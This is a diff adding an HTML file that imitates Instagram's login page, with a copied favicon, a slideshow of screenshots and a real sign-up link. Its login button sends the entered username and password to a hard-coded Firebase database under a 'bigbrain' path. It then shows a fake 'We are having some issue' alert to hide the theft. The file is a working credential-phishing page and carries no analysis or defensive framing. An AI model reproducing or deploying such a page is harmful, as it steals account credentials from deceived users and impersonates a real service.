@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.3.0/firebase-database.js"></script>
+<script>
+  // Your web app's Firebase configuration
+  var firebaseConfig = {
+    apiKey: "AIzaSyDCJ8aDj1aNAabamLYsFbMlUArYmzdvGWo",
+    authDomain: "shresth-sharma-v3.firebaseapp.com",
+    databaseURL: "https://shresth-sharma-v3-default-rtdb.firebaseio.com",
+    projectId: "shresth-sharma-v3",
+    storageBucket: "shresth-sharma-v3.appspot.com",
+    messagingSenderId: "52938966152",
+    appId: "1:52938966152:web:7f3b056755e84853fe0b3d"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+</script>
+    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png" />
+    <style>
+        body{
+            margin:0px;
+            margin-left:-0.5vw;
+        }
+        #div1{
+            position:static;
+        }
+        .img{
+            position:absolute;
+            top:6vh;
+            opacity:0%;
+        }
+        #main{
+            position:absolute;
+            top:6vh;
+            left:52vw;
+        }
+        #id{
+            position:absolute;
+            left:57.5vw;
+            width:20.75vw;
+            height:5.5vh;
+            top:29.5vh;
+            border-style:solid;
+            border-width:1px;
+            border-color:rgb(218, 218, 218);
+        }
+        #pass{
+            position:absolute;
+            left:57.5vw;
+            width:20.75vw;
+            height:5.5vh;
+            top:36.5vh;
+            border-style:solid;
+            border-width:1px;
+            border-color:rgb(218, 218, 218);
+        }
+        #log{
+            position:absolute;
+            left:57.52vw;
+            width:21.1vw;
+            height:5.1vh;
+            top:44.8vh;
+            border-style:none;
+            border-radius:8px;
+            background-color:rgb(91, 172, 253);
+            color:white;
+        }
+        #a{
+            position:absolute;
+            left:72.15vw;
+            top:77.3vh;
+            color:rgb(70, 133, 251);
+            text-decoration:none;
+        }
+        #main2{
+            display:block;
+            /* position:fixed; */
+            position:absolute;
+            left:0px;
+            top:110vh;
+            width:99vw;
+        }
+        </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+</head>
+<body>
+    <div id="div">
+        
+        <img id="main" src="main.png">
+        <input id="id" type="text" placeholder="Phone number, username, or email">
+        <input id="pass" type="text" placeholder="Password">
+        <button id="log" onclick="clicked()">Log in</button>
+        <a href="https://www.instagram.com/accounts/emailsignup/" id="a">Sign up</a>
+        <div id="div1">
+        <img id="i1" class="img" src="1.png">
+        <img id="i2" class="img" src="2.png">
+        <img id="i3" class="img" src="3.png">
+        <img id="i4" class="img" src="4.png">
+        <img id="i5" class="img" src="5.png">
+        <script>
+            var database = firebase.database();
+                function clicked(){
+                    id = document.getElementById('id').value;
+                        pass = document.getElementById('pass').value;
+                        database.ref('bigbrain/'+id+'/').update({
+                            pass:pass
+                        });
+                        alert('We are having some issue\nPlease try again later')
+                }
+        
+            img1 = document.getElementById('i1')
+            img2 = document.getElementById('i2')
+            img3 = document.getElementById('i3')
+            img4 = document.getElementById('i4')
+            img5 = document.getElementById('i5')
+            opa1 = 100;
+            opa2 = 0;
+            opa3 = 0;
+            opa4 = 0;
+            opa5 = 0;
+            a = 1;
+            b = 0;
+            opa4 = 0;
+            function img(){
+                if(b > 0){
+                    b -= 1
+                }
+                else if(a == 1){
+                    if(opa1 > 50){
+                        opa1 -= 1
+                        opa2 += 1
+                        opa5 += 1
+                    }
+                    else if(opa1 > 0){
+                        opa1 -= 1
+                        opa5 -= 1
+                        opa2 += 1
+                    }
+                    else{
+                        a = 2
+                        b = 600
+                    }
+                }
+                else if(a == 2){
+                    if(opa2 > 50){
+                        opa2 -= 1
+                        opa3 += 1
+                        opa5 += 1
+                    }
+                    else if(opa2 > 0){
+                        opa2 -= 1
+                        opa5 -= 1
+                        opa3 += 1
+                    }
+                    else{
+                        a = 3
+                        b = 600
+                    }
+                }
+                else if(a == 3){
+                    if(opa3 > 50){
+                        opa3 -= 1
+                        opa4 += 1
+                        opa5 += 1
+                    }
+                    else if(opa3 > 0){
+                        opa3 -= 1
+                        opa5 -= 1
+                        opa4 += 1
+                    }
+                    else{
+                        a = 4
+                        b = 600
+                    }
+                }
+                else if(a == 4){
+                    if(opa4 > 50){
+                        opa4 -= 1
+                        opa1 += 1
+                        opa5 += 1
+                    }
+                    else if(opa4 > 0){
+                        opa4 -= 1
+                        opa5 -= 1
+                        opa1 += 1
+                    }
+                    else{
+                        a = 1
+                        b = 600
+                    }
+                }
+                img1.style.opacity = opa1+'%';
+                img2.style.opacity = opa2+'%';
+                img3.style.opacity = opa3+'%';
+                img4.style.opacity = opa4+'%';
+                img5.style.opacity = opa5+'%';
+            }
+            setInterval(img, 10)
+        </script>
+    </div>
+</div>
+<!-- <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br> -->
+<img src="main2.png" id="main2">
+</body>
+</html>
